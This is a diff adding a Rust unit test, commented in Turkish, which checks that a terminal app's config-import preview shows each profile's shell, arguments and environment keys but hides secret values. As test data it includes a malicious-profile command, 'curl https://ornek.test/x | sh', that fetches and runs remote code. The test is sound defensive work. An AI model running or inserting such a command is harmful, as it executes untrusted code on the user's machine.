@@ -515,3 +515,49 @@ fn birlestirme_cakismayan_kimlige_dokunmuyor() {
     assert_eq!(birlesik.groups[1].tabs[0].id, "t9");
     assert_eq!(birlesik.groups[1].active_tab_id.as_deref(), Some("t9"));
 }
+
+/// On izleme profillerin CALISTIRDIGI komutu gosteriyor.
+///
+/// Ice alinan profil ilk sekmede oldugu gibi calisiyor; `describe` eskiden
+/// yalnizca profil SAYISINI tasiyordu ve `shell: /bin/sh, args: ["-c", "curl …
+/// | sh"]` yazan paylasilan bir dosya "3 profil" diye onaylaniyordu. Ad, tur,
+/// kabuk, argumanlar ve ortam ANAHTARLARI (degerler degil: sir olabilir)
+/// on izlemeye gidiyor.
+#[test]
+fn on_izleme_profil_komutlarini_tasiyor() {
+    let mut settings = Settings::default();
+    let mut tehlikeli = profile("Kurulum", "/bin/sh");
+    tehlikeli.kind = ShellKind::Custom;
+    tehlikeli.args = vec!["-c".into(), "curl https://ornek.test/x | sh".into()];
+    tehlikeli.env.insert("TOKEN".into(), "gizli".into());
+    settings.profiles = vec![tehlikeli];
+    let bundle = Bundle {
+        kind: "nterminal-config".into(),
+        version: BUNDLE_VERSION,
+        exported_at: 0,
+        app_version: "0.0.0".into(),
+        machine: String::new(),
+        portable_paths: false,
+        settings: Some(settings),
+        workspace: None,
+        history: None,
+        favorites: None,
+        scrollback: None,
+    };
+
+    let info = describe(Path::new("x.nterminal.json"), &bundle, Vec::new());
+    assert_eq!(info.profiles, 1);
+    assert_eq!(
+        info.profile_list,
+        vec![ProfilePreview {
+            name: "Kurulum".into(),
+            kind: ShellKind::Custom,
+            shell: "/bin/sh".into(),
+            args: vec!["-c".into(), "curl https://ornek.test/x | sh".into()],
+            env_keys: vec!["TOKEN".into()],
+        }]
+    );
+    let json = serde_json::to_string(&info).unwrap();
+    assert!(json.contains("\"profileList\""), "arayuzun bekledigi ad yok: {json}");
+    assert!(!json.contains("gizli"), "ortam DEGERI on izlemeye sizdi");
+}
